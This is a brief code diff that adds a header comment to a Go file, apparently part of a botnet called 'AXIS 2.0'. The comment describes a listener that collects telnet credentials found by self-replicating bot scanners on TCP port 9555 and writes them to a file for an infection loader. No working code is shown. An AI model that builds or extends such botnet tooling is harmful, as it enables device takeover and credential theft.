@@ -1,4 +1,10 @@
 // AXIS 2.0 - Scan Result Listener
+// ============================================================================
+// Receives scan results from bot self-replication scanners
+// Listens on TCP port 9555 for incoming reports
+// Outputs successful credentials to telnet.txt for loader consumption
+// Format: IP:PORT username:password
+// ============================================================================
 
 package main
 
